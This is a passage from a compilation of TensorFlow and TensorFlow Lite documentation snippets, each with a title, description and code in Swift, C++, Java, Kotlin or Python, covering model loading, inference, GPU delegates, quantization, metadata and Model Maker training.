SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/inference.md#_snippet_9

LANGUAGE: Swift
CODE:
```
// Getting model path
guard
  let modelPath = Bundle.main.path(forResource: "model", ofType: "tflite")
else {
  // Error handling...
}

do {
  // Initialize an interpreter with the model.
  let interpreter = try Interpreter(modelPath: modelPath)

  // Allocate memory for the model's input `Tensor`s.
  try interpreter.allocateTensors()

  let inputData: Data  // Should be initialized

  // input data preparation...

  // Copy the input data to the input `Tensor`.
  try self.interpreter.copy(inputData, toInputAt: 0)

  // Run inference by invoking the `Interpreter`.
  try self.interpreter.invoke()

  // Get the output `Tensor`
  let outputTensor = try self.interpreter.output(at: 0)

  // Copy output to `Data` to process the inference results.
  let outputSize = outputTensor.shape.dimensions.reduce(1, {x, y in x * y})
  let outputData =
        UnsafeMutableBufferPointer<Float32>.allocate(capacity: outputSize)
  outputTensor.data.copyBytes(to: outputData)

  if (error != nil) { /* Error handling... */ }
} catch error {
  // Error handling...
}
```

----------------------------------------

TITLE: Running Simple TFLite Inference in C++
DESCRIPTION: Presents a simplified workflow for loading a TFLite model and executing inference using the C++ Interpreter API. It covers loading the model, building the interpreter with a resolver, allocating tensors, accessing typed input/output tensors, and invoking the interpreter.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/inference.md#_snippet_15

LANGUAGE: C++
CODE:
```
// Load the model
std::unique_ptr<tflite::FlatBufferModel> model =
    tflite::FlatBufferModel::BuildFromFile(filename);

// Build the interpreter
tflite::ops::builtin::BuiltinOpResolver resolver;
std::unique_ptr<tflite::Interpreter> interpreter;
tflite::InterpreterBuilder(*model, resolver)(&interpreter);

// Resize input tensors, if desired.
interpreter->AllocateTensors();

float* input = interpreter->typed_input_tensor<float>(0);
// Fill `input`.

interpreter->Invoke();

float* output = interpreter->typed_output_tensor<float>(0);
```

----------------------------------------

TITLE: Create TFLite Interpreter with GPU Delegate (Java)
DESCRIPTION: Configures `InterpreterApi.Options` to use the GPU delegate factory by adding a new `GpuDelegateFactory()`. It then initializes an `Interpreter` instance using the `InterpreterApi` constructor with the loaded model and these GPU-enabled options. Demonstrates a placeholder for running inference using the configured interpreter. Requires a loaded TFLite `model` and input/output data structures.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/delegates/gpu.md#_snippet_4

LANGUAGE: Java
CODE:
```
Options options = InterpreterApi.Options()
      .setRuntime(TfLiteRuntime.FROM_SYSTEM_ONLY)
      .addDelegateFactory(new GpuDelegateFactory());

    Interpreter interpreter = new InterpreterApi(model, options);

    // Run inference
    writeToInput(input);
    interpreter.run(input, output);
    readFromOutput(output);
```

----------------------------------------

TITLE: Getting TFLite Input Tensor Index by Name Java
DESCRIPTION: Retrieves the numerical index for a TensorFlow Lite model's input tensor based on its operation name. This is useful for programmatic access to inputs when not using signatures. Throws `IllegalArgumentException` if the name is invalid.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/inference.md#_snippet_5

LANGUAGE: Java
CODE:
```
public int getInputIndex(String opName);
```

----------------------------------------

TITLE: Modified TensorFlow Lite Runtime Import in Python
DESCRIPTION: This Python import statement replaces the full TensorFlow import when using the `tflite_runtime` package. It specifically imports the `interpreter` module from `tflite_runtime`, typically aliased as `tflite`, providing access to the `Interpreter` class.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/python.md#_snippet_2

LANGUAGE: python
CODE:
```
import tflite_runtime.interpreter as tflite
```

----------------------------------------

TITLE: Running Object Detection Inference - TensorFlow Lite - Kotlin
DESCRIPTION: Initiates the object detection inference process. Calls the `detect` method on the initialized `objectDetector` instance, passing the preprocessed `TensorImage` object. This executes the TensorFlow Lite model against the image data to produce detection results.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/quickstart.md#_snippet_13

LANGUAGE: Kotlin
CODE:
```
val results = objectDetector?.detect(tensorImage)
```

----------------------------------------

TITLE: Resizing Dynamic Input Tensor C++
DESCRIPTION: Provides a C++ example for handling dynamic input shapes in a TFLite model. It shows how to use 'interpreter->ResizeInputTensor' to specify the desired input shape (e.g., {3, 10}) before calling 'interpreter->AllocateTensors'. Requires a loaded TFLite 'interpreter' object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/inference.md#_snippet_20

LANGUAGE: c++
CODE:
```
// Resize input tensors before allocate tensors
interpreter->ResizeInputTensor(/*tensor_index=*/0, std::vector<int>{3,10});
interpreter->AllocateTensors();
```

----------------------------------------

TITLE: Creating TFLite Audio Classifier Metadata for Inference (Python)
DESCRIPTION: This class method creates the mandatory metadata required for TFLite Support inference features like Task library and Codegen tools. It takes the model buffer, audio sample rate, channels, label file paths, and optional score calibration metadata, returning a `MetadataWriter` object with default values for other fields.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/audio_classifier/MetadataWriter.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
create_for_inference(
    model_buffer: bytearray,
    sample_rate: int,
    channels: int,
    label_file_paths: List[str],
    score_calibration_md: Optional[tflite_support.metadata_writers.metadata_info.ScoreCalibrationMd] = None
)
```

----------------------------------------

TITLE: Creating Mandatory Metadata for TFLite Inference (Python)
DESCRIPTION: This class method creates essential metadata for TFLite Support inference features like Task library and Codegen tool. It takes the model buffer, input normalization parameters (mean and std), and paths to label files as mandatory arguments, returning a MetadataWriter object. Other metadata fields are set to default.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/image_segmenter/MetadataWriter.md#_snippet_1

LANGUAGE: Python
CODE:
```
@classmethod
create_for_inference(
    model_buffer: bytearray,
    input_norm_mean: List[float],
    input_norm_std: List[float],
    label_file_paths: List[str]
)
```

----------------------------------------

TITLE: Adding TensorFlowLite Swift Pod (Ruby)
DESCRIPTION: Specifies the 'TensorFlowLiteSwift' library as a dependency within a CocoaPods 'Podfile'. Running 'pod install' after adding this line will download and integrate the Swift library into the Xcode project.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/swift/README.md#_snippet_1

LANGUAGE: ruby
CODE:
```
pod 'TensorFlowLiteSwift'
```

----------------------------------------

TITLE: Creating NLClassifier from File in Python
DESCRIPTION: Documents the `create_from_file` class method for the `NLClassifier`. This method takes a string `file_path` pointing to a TensorFlow Lite model file. It initializes and returns a new `NLClassifier` object created from the specified model file. It may raise `ValueError` or `RuntimeError` if the file is invalid or an error occurs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/NLClassifier.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
create_from_file(
    file_path: str
) -> 'NLClassifier'
```

----------------------------------------

TITLE: Evaluating Quantized TFLite Model Accuracy Python
DESCRIPTION: This snippet defines a function `evaluate_model` to calculate the accuracy of a given TensorFlow Lite model using a TFLite interpreter. It iterates through test data, performs inference for each sample, determines the predicted class, and computes the overall accuracy. It then calls this function to evaluate the accuracy of the previously converted and quantized TFLite model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/tutorials/pose_classification.ipynb#_snippet_24

LANGUAGE: python
CODE:
```
def evaluate_model(interpreter, X, y_true):
  """Evaluates the given TFLite model and return its accuracy."""
  input_index = interpreter.get_input_details()[0]["index"]
  output_index = interpreter.get_output_details()[0]["index"]

  # Run predictions on all given poses.
  y_pred = []
  for i in range(len(y_true)):
    # Pre-processing: add batch dimension and convert to float32 to match with
    # the model's input data format.
    test_image = X[i: i + 1].astype('float32')
    interpreter.set_tensor(input_index, test_image)

    # Run inference.
    interpreter.invoke()

    # Post-processing: remove batch dimension and find the class with highest
    # probability.
    output = interpreter.tensor(output_index)
    predicted_label = np.argmax(output()[0])
    y_pred.append(predicted_label)

  # Compare prediction results with ground truth labels to calculate accuracy.
  y_pred = keras.utils.to_categorical(y_pred)
  return accuracy_score(y_true, y_pred)

# Evaluate the accuracy of the converted TFLite model
classifier_interpreter = tf.lite.Interpreter(model_content=tflite_model)
classifier_interpreter.allocate_tensors()
print('Accuracy of TFLite model: %s' %
      evaluate_model(classifier_interpreter, X_test, y_test))
```

----------------------------------------

TITLE: Importing Libraries (Python)
DESCRIPTION: Imports required Python libraries including `numpy`, `os`, `tensorflow`, and various modules from `tflite_model_maker`. This makes the necessary classes and functions available for use in the notebook, such as `model_spec`, `question_answer`, `ExportFormat`, and `DataLoader`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/question_answer.ipynb#_snippet_3

LANGUAGE: python
CODE:
```
import numpy as np
import os

import tensorflow as tf
assert tf.__version__.startswith('2')

from tflite_model_maker import model_spec
from tflite_model_maker import question_answer
from tflite_model_maker.config import ExportFormat
from tflite_model_maker.question_answer import DataLoader
```

----------------------------------------

TITLE: Initialize DataLoader for Text Classification (Python)
DESCRIPTION: This snippet shows the constructor signature for the `tflite_model_maker.text_classifier.DataLoader` class. It is used to create an instance of the data loader, requiring a `tf.data.Dataset` object, the dataset size, and a mapping from label indices to string labels. It serves as the data source for training text classification models.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/DataLoader.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.text_classifier.DataLoader(
    dataset, size, index_to_label
)
```

----------------------------------------

TITLE: Initializing EfficientDet-Lite4 Model Spec in Python
DESCRIPTION: This code snippet shows the constructor signature for `EfficientDetLite4Spec`. It details the available parameters and their default values for configuring the EfficientDet-Lite4 object detection model specification within the TensorFlow Lite Model Maker library. It requires the `tflite_model_maker` library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/object_detector/EfficientDetLite4Spec.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_model_maker.object_detector.EfficientDetLite4Spec(
    *,
    model_name='efficientdet-lite4',
    uri='https://tfhub.dev/tensorflow/efficientdet/lite4/feature-vector/2',
    hparams='',
    model_dir=None,
    epochs=50,
    batch_size=64,
    steps_per_execution=1,
    moving_average_decay=0,
    var_freeze_expr='(efficientnet|fpn_cells|resample_p6)',
    tflite_max_detections=25,
    strategy=None,
    tpu=None,
    gcp_project=None,
    tpu_zone=None,
    use_xla=False,
    profile=False,
    debug=False,
    tf_random_seed=111111,
    verbose=0
)
```

----------------------------------------

TITLE: Add Interpreter API Dependencies - Gradle
DESCRIPTION: This snippet shows how to add the Gradle dependencies for the TensorFlow Lite Interpreter API and the optional Support Library that use Google Play services. These dependencies are required to access the lower-level TFLite APIs provided by Play services.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/java.md#_snippet_4

LANGUAGE: Groovy
CODE:
```
dependencies {
...
    // Tensorflow Lite dependencies for Google Play services
    implementation 'com.google.android.gms:play-services-tflite-java:16.0.1'
    // Optional: include Tensorflow Lite Support Library
    implementation 'com.google.android.gms:play-services-tflite-support:16.0.1'
...
}
```

----------------------------------------

TITLE: Example Output of TFLite Model as C Array (C)
DESCRIPTION: This C code snippet shows the structure of the output generated by the `xxd` command when converting a TensorFlow Lite model to a C array. It includes the `unsigned char` array containing the model's byte data and an `unsigned int` variable storing the total length of the array. This format allows the model data to be compiled directly into the microcontroller's firmware.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/microcontrollers/build_convert.md#_snippet_1

LANGUAGE: c
CODE:
```
unsigned char converted_model_tflite[] = {
  0x18, 0x00, 0x00, 0x00, 0x54, 0x46, 0x4c, 0x33, 0x00, 0x00, 0x0e, 0x00,
  // <Lines omitted>
};
unsigned int converted_model_tflite_len = 18200;
```

----------------------------------------

TITLE: Generating Execution Timeline (tfprof)
DESCRIPTION: This tfprof command uses the `graph` view to generate a timeline file suitable for viewing in Chrome's `chrome://tracing`. It sets a large max depth, specifies a step (0 in this case), filters which devices/tasks to include (`account_type_regexes` for GPU 3 and worker CPU 0), and directs the output to a timeline file specified by `outfile=<filename.json>`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/profiler/g3doc/profile_time.md#_snippet_6

LANGUAGE: tfprof
CODE:
```
graph -max_depth 10000000 -step 0 -account_type_regexes .*gpu:3.*,.*worker.*cpu:0.* -output timeline:outfile=<filename.json>
```

----------------------------------------

TITLE: Evaluating Recommendation Model - TensorFlow Model Maker Python
DESCRIPTION: This method evaluates the performance of the trained model using a provided dataset. It accepts evaluation data and a batch size for processing. The method returns the history object produced by the Keras `model.evaluate()` call.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/recommendation/Recommendation.md#_snippet_4

LANGUAGE: Python
CODE:
```
evaluate(
    data, batch_size=10
)
```

----------------------------------------

TITLE: Saving TensorFlow Lite Models Python
DESCRIPTION: These lines save the generated TensorFlow Lite models to files on the local filesystem. The unquantized (float) model and the integer-only quantized model are saved separately for later use and comparison.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant.ipynb#_snippet_9

LANGUAGE: Python
CODE:
```
tflite_model_file = tflite_models_dir/"mnist_model.tflite"
tflite_model_file.write_bytes(tflite_model)
# Save the quantized model:
tflite_model_quant_file = tflite_models_dir/"mnist_model_quant.tflite"
tflite_model_quant_file.write_bytes(tflite_model_quant)
```

----------------------------------------

TITLE: Processing Image for TFLite Input using ImageProcessor Java
DESCRIPTION: This Java snippet demonstrates the basic usage of `ImageProcessor` and `TensorImage` to preprocess an image (`Bitmap`) for TensorFlow Lite inference. It initializes an `ImageProcessor` with a resize operation and then loads a `Bitmap` into a `TensorImage` before applying the processing steps to convert it into the required tensor format.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/lite_support.md#_snippet_1

LANGUAGE: Java
CODE:
```
import org.tensorflow.lite.DataType;
import org.tensorflow.lite.support.image.ImageProcessor;
import org.tensorflow.lite.support.image.TensorImage;
import org.tensorflow.lite.support.image.ops.ResizeOp;

// Initialization code
// Create an ImageProcessor with all ops required. For more ops, please
// refer to the ImageProcessor Architecture section in this README.
ImageProcessor imageProcessor =
    new ImageProcessor.Builder()
        .add(new ResizeOp(224, 224, ResizeOp.ResizeMethod.BILINEAR))
        .build();

// Create a TensorImage object. This creates the tensor of the corresponding
// tensor type (uint8 in this case) that the TensorFlow Lite interpreter needs.
TensorImage tensorImage = new TensorImage(DataType.UINT8);

// Analysis code for every frame
// Preprocess the image
tensorImage.load(bitmap);
tensorImage = imageProcessor.process(tensorImage);
```

----------------------------------------

TITLE: Initializing ObjectDetectorOptions TensorFlow Lite Python
DESCRIPTION: Describes the constructor for the `ObjectDetectorOptions` class used to configure an object detection task. It requires `base_options` for general TFLite task settings and optionally accepts `detection_options` to tailor detection specifics like score thresholds or maximum results. This class is essential for setting up a TFLite object detection model's behavior.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ObjectDetectorOptions.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.task.vision.ObjectDetectorOptions(
    base_options: tflite_support.task.core.BaseOptions,
    detection_options: tflite_support.task.processor.DetectionOptions = dataclasses.field(default_factory=_DetectionOptions)
)
```

----------------------------------------

TITLE: Iterating Distributed Dataset with AutoGraph for loop Python
DESCRIPTION: Demonstrates AutoGraph's handling of `for` loops over a distributed dataset, converting them into the dataset's specialized `reduce` operations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_23

LANGUAGE: Python
CODE:
```
for i in tf.distribute.OneDeviceStrategy('cpu').experimental_distribute_dataset(
    tf.data.Dataset.range(3)):
  tf.print('iteration:', i)
```

----------------------------------------

TITLE: Initializing QuantizationConfig Python
DESCRIPTION: Initializes a configuration object for post-training quantization within TensorFlow Lite Model Maker. It allows setting various options including optimization types, representative data for calibration, and target data types for inference inputs and outputs, providing fine-grained control over the quantization process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/config/QuantizationConfig.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.config.QuantizationConfig(
    optimizations=None,
    representative_data=None,
    quantization_steps=None,
    inference_input_type=None,
    inference_output_type=None,
    supported_ops=None,
    supported_types=None,
    experimental_new_quantizer=None
)
```

----------------------------------------

TITLE: Compute Cosine Similarity with TensorFlow Lite Embedder Python
DESCRIPTION: Computes the cosine similarity between two feature vectors. Requires `FeatureVector` objects as input. Returns a float value representing the similarity.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ImageEmbedder.md#_snippet_0

LANGUAGE: python
CODE:
```
cosine_similarity(
    u: tflite_support.task.processor.FeatureVector,
    v: tflite_support.task.processor.FeatureVector
) -> float
```

----------------------------------------

TITLE: Reading TFLite Metadata and Exporting to JSON (Python)
DESCRIPTION: This Python code shows how to extract metadata from an existing TFLite model file using the `MetadataDisplayer`. It retrieves the metadata as a JSON string and includes optional code to save this JSON string to a local file. Requires the `tensorflow_lite_support.metadata.python` library and the `os` module.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata.md#_snippet_8

LANGUAGE: python
CODE:
```
displayer = _metadata.MetadataDisplayer.with_model_file(export_model_path)
export_json_file = os.path.join(FLAGS.export_directory,
                                os.path.splitext(model_basename)[0] + ".json")
json_file = displayer.get_metadata_json()
# Optional: write out the metadata as a json file
with open(export_json_file, "w") as f:
  f.write(json_file)
```

----------------------------------------

TITLE: Using the Custom TensorFlow Op in Python
DESCRIPTION: This Python code demonstrates how to import the custom `multiplex_1_op` module and use the `multiplex` function. It shows how to create input TensorFlow tensors, call the custom op, and retrieve the result as a NumPy array.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_1/README.md#_snippet_13

LANGUAGE: python
CODE:
```
import tensorflow as tf
from tensorflow.examples.custom_ops_doc.multiplex_1 import multiplex_1_op

a = tf.constant([1, 2, 3, 4, 5])
b = tf.constant([10, 20, 30, 40, 50])
cond = tf.constant([True, False, True, False, True], dtype=bool)

result = multiplex_1_op.multiplex(cond, a, b)
result.numpy()
```

----------------------------------------

TITLE: Running Composed Keras Model with TF NumPy in Distribution Strategy
DESCRIPTION: Re-creates the composed Keras Sequential model and defines a `@tf.function` that calls this model with random TF NumPy inputs. The function is then executed under the `MirroredStrategy`, showing that Keras models using TF NumPy operations can be run distributedly.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Keras_and_Distribution_Strategy.ipynb#_snippet_7

LANGUAGE: python
CODE:
```
# Test running the model in a distributed setting.
model = tf.keras.Sequential([tf.keras.layers.Dense(units), ProjectionLayer(2)])

@tf.function
def model_replica_fn():
  inputs = tnp.random.randn(batch_size, units).astype(tnp.float32)
  return model.call(inputs)

print("Outputs:\n", strategy.run(model_replica_fn).values)
```

----------------------------------------

TITLE: Performing On-Device Training Java
DESCRIPTION: Demonstrates how to perform model training on-device using the TensorFlow Lite Java API. It initializes the interpreter, prepares input data batches, and iteratively calls the 'train' signature via `runSignature`, tracking the loss over epochs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/on_device_training/overview.ipynb#_snippet_12

LANGUAGE: java
CODE:
```
try (Interpreter interpreter = new Interpreter(modelBuffer)) {
    int NUM_EPOCHS = 100;
    int BATCH_SIZE = 100;
    int IMG_HEIGHT = 28;
    int IMG_WIDTH = 28;
    int NUM_TRAININGS = 60000;
    int NUM_BATCHES = NUM_TRAININGS / BATCH_SIZE;

    List<FloatBuffer> trainImageBatches = new ArrayList<>(NUM_BATCHES);
    List<FloatBuffer> trainLabelBatches = new ArrayList<>(NUM_BATCHES);

    // Prepare training batches.
    for (int i = 0; i < NUM_BATCHES; ++i) {
        FloatBuffer trainImages = FloatBuffer.allocateDirect(BATCH_SIZE * IMG_HEIGHT * IMG_WIDTH).order(ByteOrder.nativeOrder());
        FloatBuffer trainLabels = FloatBuffer.allocateDirect(BATCH_SIZE * 10).order(ByteOrder.nativeOrder());

        // Fill the data values...
        trainImageBatches.add(trainImages.rewind());
        trainImageLabels.add(trainLabels.rewind());
    }

    // Run training for a few steps.
    float[] losses = new float[NUM_EPOCHS];
    for (int epoch = 0; epoch < NUM_EPOCHS; ++epoch) {
        for (int batchIdx = 0; batchIdx < NUM_BATCHES; ++batchIdx) {
            Map<String, Object> inputs = new HashMap<>();
            inputs.put("x", trainImageBatches.get(batchIdx));
            inputs.put("y", trainLabelBatches.get(batchIdx));

            Map<String, Object> outputs = new HashMap<>();
            FloatBuffer loss = FloatBuffer.allocate(1);
            outputs.put("loss", loss);

            interpreter.runSignature(inputs, outputs, "train");

            // Record the last loss.
            if (batchIdx == NUM_BATCHES - 1) losses[epoch] = loss.get(0);
        }

        // Print the loss output for every 10 epochs.
        if ((epoch + 1) % 10 == 0) {
            System.out.println(
              "Finished " + (epoch + 1) + " epochs, current loss: " + loss.get(0));
        }
    }

    // ...
}
```

----------------------------------------

TITLE: Evaluating Model Performance (Python)
DESCRIPTION: Evaluates the performance of the fine-tuned model on the validation dataset (`validation_data`) using `model.evaluate()`. This computes and returns key metrics like F1 score and exact match, allowing assessment of the model's generalization ability on unseen data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/question_answer.ipynb#_snippet_9

LANGUAGE: python
CODE:
```
model.evaluate(validation_data)
```

----------------------------------------

TITLE: Getting All Tensor Details in TFLite Python
DESCRIPTION: Returns a list of dictionaries containing detailed information (like shape, type, index, name) for all valid tensors in the TFLite model. This is useful for programmatically identifying input and output tensors or inspecting intermediate ones.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/Interpreter.md#_snippet_12

LANGUAGE: python
CODE:
```
get_tensor_details()
```

----------------------------------------

TITLE: Predicting with TFLite NLClassifier in Python
DESCRIPTION: Demonstrates how to use the initialized TFLite NLClassifier to perform inference on a sample of sentences from the loaded demo data. It iterates through the first 20 sentences, classifies them, and prints the ground truth label alongside the predicted label with the highest probability.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_classification.ipynb#_snippet_13

LANGUAGE: python
CODE:
```
for idx in range(20):
  sentence = sentence_data['sentence'].iloc[idx]
  label = sentence_data['label'].iloc[idx]
  text_classification_result = classifier.classify(sentence)
  classification_list = text_classification_result.classifications[0].categories

  # Sort output by probability descending.
  predict_label = sorted(
      classification_list, key=lambda item: item.score, reverse=True)[0]

  print('truth_label: {} -----> predict_label: {}'.format(label, predict_label.category_name))
```

----------------------------------------

TITLE: Using TFLite `tensor()` for Direct Access (Python)
DESCRIPTION: Illustrates the correct way to use the `tensor()` method to get direct NumPy views of input and output buffers. It shows how to obtain the view *after* `allocate_tensors()` and use it within a loop, re-obtaining views if necessary (though not explicitly shown across allocation).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/Interpreter.md#_snippet_19

LANGUAGE: python
CODE:
```
interpreter.allocate_tensors()
input = interpreter.tensor(interpreter.get_input_details()[0]["index"])
output = interpreter.tensor(interpreter.get_output_details()[0]["index"])
for i in range(10):
  input().fill(3.)
  interpreter.invoke()
  print("inference %s" % output())
```

----------------------------------------

TITLE: Zipping TFLite Model and Labels Shell
DESCRIPTION: This snippet uses a shell command (often executed via `!` in environments like Colab or Jupyter) to create a zip archive. The archive, named 'pose_classifier.zip', contains the generated TensorFlow Lite model file ('pose_classifier.tflite') and the label file ('pose_labels.txt').
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/tutorials/pose_classification.ipynb#_snippet_25

LANGUAGE: python
CODE:
```
!zip pose_classifier.zip pose_labels.txt pose_classifier.tflite
```

----------------------------------------

TITLE: Training Keras LSTM Model Python
DESCRIPTION: This snippet loads the MNIST dataset, scales pixel values to 0-1, and casts them to float32. It includes an option for fast training with a small subset and few epochs. Finally, it trains the defined Keras model on the training data for a specified number of epochs and evaluates its performance on the test set.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/experimental_new_converter/Keras_LSTM_fusion_Codelab.ipynb#_snippet_3

LANGUAGE: Python
CODE:
```
# Load MNIST dataset.
(x_train, y_train), (x_test, y_test) = tf.keras.datasets.mnist.load_data()
x_train, x_test = x_train / 255.0, x_test / 255.0
x_train = x_train.astype(np.float32)
x_test = x_test.astype(np.float32)

# Change this to True if you want to test the flow rapidly.
# Train with a small dataset and only 1 epoch. The model will work poorly
# but this provides a fast way to test if the conversion works end to end.
_FAST_TRAINING = False
_EPOCHS = 5
if _FAST_TRAINING:
  _EPOCHS = 1
  _TRAINING_DATA_COUNT = 1000
  x_train = x_train[:_TRAINING_DATA_COUNT]
  y_train = y_train[:_TRAINING_DATA_COUNT]

model.fit(x_train, y_train, epochs=_EPOCHS)
model.evaluate(x_test, y_test, verbose=0)
```

----------------------------------------

TITLE: Specify TensorFlowLiteC Nightly Dependency (Podspec)
DESCRIPTION: Sets the dependency for the `TensorFlowLiteC` pod to use the latest available nightly build version, allowing developers to test local changes against a recent core library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_ios.md#_snippet_6

LANGUAGE: Ruby
CODE:
```
s.dependency 'TensorFlowLiteC', "~> 0.0.1-nightly"
```

----------------------------------------

TITLE: Configuring GPU Delegate in Task Options (C++)
DESCRIPTION: This C++ snippet illustrates how to configure and enable the GPU delegate within the options for a TensorFlow Lite Task Library task, using `BertQuestionAnswerer` as an example. It shows how to load the model file, set the delegate type in `tflite_settings`, and optionally enable automatic fallback.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/overview.md#_snippet_3

LANGUAGE: C++
CODE:
```
// Initialization
BertQuestionAnswererOptions options;
// Load the TFLite model.
auto base_options = options.mutable_base_options();
base_options->mutable_model_file()->set_file_name(model_file);
// Turn on GPU delegation.
auto tflite_settings = base_options->mutable_compute_settings()->mutable_tflite_settings();
tflite_settings->set_delegate(Delegate::GPU);
// (optional) Turn on automatical fallback to TFLite CPU path on delegation errors.
tflite_settings->mutable_fallback_settings()->set_allow_automatic_fallback_on_execution_error(true);

// Create QuestionAnswerer from options.
std::unique_ptr<QuestionAnswerer> answerer = BertQuestionAnswerer::CreateFromOptions(options).value();

// Run inference on GPU.
std::vector<QaAnswer> results = answerer->Answer(context_of_question, question_to_ask);
```

----------------------------------------

TITLE: Training Recommendation Model - TensorFlow Model Maker Python
DESCRIPTION: This method trains the model using the provided training data. It allows specifying optional validation data, batch size, steps per epoch, and the total number of training epochs. The method returns the history object from the Keras `model.fit()` call.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/recommendation/Recommendation.md#_snippet_8

LANGUAGE: Python
CODE:
```
train(
    train_data,
    validation_data=None,
    batch_size=16,
    steps_per_epoch=100,
    epochs=1
)
```

----------------------------------------

TITLE: Getting Populated Metadata JSON (TensorFlow Lite, Python)
DESCRIPTION: This function retrieves the JSON metadata string that has been generated and populated into the TensorFlow Lite model buffer. It provides access to the metadata as it exists within the model, potentially including fields added by a MetadataPopulator. Use this method to get the final metadata structure embedded in the model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/bert_nl_classifier/MetadataWriter.md#_snippet_5

LANGUAGE: python
CODE:
```
get_populated_metadata_json() -> str

```

----------------------------------------

TITLE: Populating Metadata into TFLite Model (Python)
DESCRIPTION: This method performs the core action of writing the constructed metadata and any associated files, such as label files, directly into the TFLite model buffer. It returns a new `bytearray` representing the modified model file containing the embedded metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/image_segmenter/MetadataWriter.md#_snippet_6

LANGUAGE: Python
CODE:
```
populate() -> bytearray
```

----------------------------------------

TITLE: Converting Keras Model with Dynamic Range Quantization TFLite Python
DESCRIPTION: Initializes the TensorFlow Lite Converter from the Keras model and sets the `optimizations` property to `[tf.lite.Optimize.DEFAULT]`. This enables dynamic range quantization, primarily quantizing model weights while leaving other data like inputs and outputs in float format.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant.ipynb#_snippet_3

LANGUAGE: python
CODE:
```
converter = tf.lite.TFLiteConverter.from_keras_model(model)
converter.optimizations = [tf.lite.Optimize.DEFAULT]

tflite_model_quant = converter.convert()
```

----------------------------------------

TITLE: Shuffling and Batching Dataset for Training - Python
DESCRIPTION: This applies shuffling and final batching to the dataset using the configured buffer and batch sizes. The dataset is now ready to be fed into the training loop of the RNN model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_14

LANGUAGE: python
CODE:
```
dataset = dataset.shuffle(BUFFER_SIZE).batch(BATCH_SIZE, drop_remainder=True)

dataset
```

----------------------------------------

